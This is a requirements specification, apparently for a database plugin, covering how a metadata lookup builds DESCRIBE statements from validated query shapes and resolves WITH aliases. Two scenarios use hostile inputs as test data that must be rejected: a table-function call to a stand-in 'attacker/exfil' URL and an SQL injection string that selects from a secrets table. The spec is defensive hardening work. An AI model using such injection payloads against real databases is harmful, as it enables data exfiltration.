## MODIFIED Requirements

### Requirement: Metadata key lookup builds DESCRIBE from validated shapes

`QueryKeys` SHALL determine its `DESCRIBE` target from the parsed query shape rather than a substring heuristic. For a real table reference it SHALL emit a quoted identifier via `quoteIdentifier`; for a genuine subquery it SHALL wrap the expression and verify the assembled statement re-parses to exactly one `DESCRIBE` over a subquery. Table functions (e.g. `url`, `remote`, `s3`, `file`), JOINs, and other arbitrary FROM expressions SHALL be rejected with a typed error. The `strings.Contains(..., "SELECT")` heuristic SHALL be removed.

When a FROM reference is a bare identifier that matches a WITH-clause alias in scope, CTE extraction SHALL resolve it to the alias's defining subquery (parenthesized) before it reaches `QueryKeys`, so the lookup describes the subquery via the validated subquery path. A bare identifier that matches no in-scope WITH alias SHALL continue to be treated and validated as a table reference. Resolution introduces no new trust: the resolved subquery flows through the same re-parse/shape check as any inline subquery.

#### Scenario: Real table becomes a quoted DESCRIBE target

- **GIVEN** a resolved table reference `events` in database `logs`
- **WHEN** `QueryKeys` builds its SQL
- **THEN** the `DESCRIBE` target SHALL be the backtick-quoted identifier form

#### Scenario: WITH-alias FROM resolves to the CTE subquery

- **GIVEN** the SQL `WITH x AS (SELECT a, b FROM events) SELECT * FROM x WHERE $__adHocFilter()`
- **WHEN** the ad-hoc filter macro resolves the schema for the FROM reference `x`
- **THEN** the `DESCRIBE` target SHALL be the alias's subquery `(SELECT a, b FROM events)`, not the identifier `` `x` ``
- **AND** the assembled statement SHALL re-parse to exactly one `DESCRIBE` over a subquery

#### Scenario: Identifier that is not a WITH alias stays a table reference

- **GIVEN** the SQL `SELECT * FROM events WHERE $__adHocFilter()` with no WITH clause
- **WHEN** the macro resolves the schema for `events`
- **THEN** the `DESCRIBE` target SHALL be the backtick-quoted identifier `` `events` ``

#### Scenario: Table function is rejected

- **GIVEN** a metadata target `url('http://attacker/exfil', CSV, 'c String')`
- **WHEN** `QueryKeys` runs
- **THEN** it SHALL return a non-nil typed error
- **AND** SHALL NOT issue a `DESCRIBE` over the table function

#### Scenario: Injected CTE string cannot break out

- **GIVEN** a metadata target `t) UNION ALL SELECT * FROM secrets --`
- **WHEN** `QueryKeys` runs
- **THEN** it SHALL either reject the input or emit a statement that re-parses to exactly one `DESCRIBE`
- **AND** SHALL NOT issue a `UNION ALL SELECT * FROM secrets`
